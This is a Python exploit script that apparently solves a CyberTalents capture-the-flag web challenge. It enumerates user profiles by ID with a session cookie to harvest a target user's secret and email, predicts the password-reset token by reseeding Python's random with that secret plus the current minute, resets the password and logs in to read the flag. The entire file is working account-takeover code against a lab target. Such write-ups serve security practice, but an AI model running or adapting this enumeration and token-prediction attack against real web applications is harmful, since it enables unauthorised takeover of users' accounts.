import requests
import random
from datetime import datetime, timedelta
import string
import re

url = 'http://<chall>.cybertalentslabs.com/'

def retrive_secret_and_mail():
	for i in range(1,800):
	
		res = requests.get(url+"profile/"+str(i),cookies={'session':'<session>'})
		if 'MarielCalderwood' in res.text :
			secret = re.findall(r'<p>(.*?)</p>',res.text.split('\n')[60])[0]
			mail = re.findall(r'<p>(.*?)</p>',res.text.split('\n')[56])[0]
			return secret,mail

def generate_reset_token(secret):
    letters_and_digits = string.ascii_uppercase + string.digits

    current_time_minutes = int(datetime.now().timestamp() // 60)
    seed = secret + str(current_time_minutes)

    random.seed(seed)
    reset_token = ''.join(random.choice(letters_and_digits) for _ in range(32))

    return reset_token

def create_reset_token(mail):
	res = requests.post(url+'forgot_password',data={'email':f'{mail}'})

def reset_passwd(reset_token):
	res = requests.post(url+'reset_password/'+reset_token,data={'new_password':'pwd123'})

def get_flag(mail):
	res = requests.post(url+'/login',data={'email':f'{mail}','password':'pwd123'})
	return re.findall(r'\bflag{\w*}',res.text)[0]

if __name__ == '__main__':

	secret = retrive_secret_and_mail()[0]
	mail = retrive_secret_and_mail()[1]
	create_reset_token(mail)
	reset_token = generate_reset_token(secret)
	reset_passwd(reset_token)
	print(get_flag(mail))


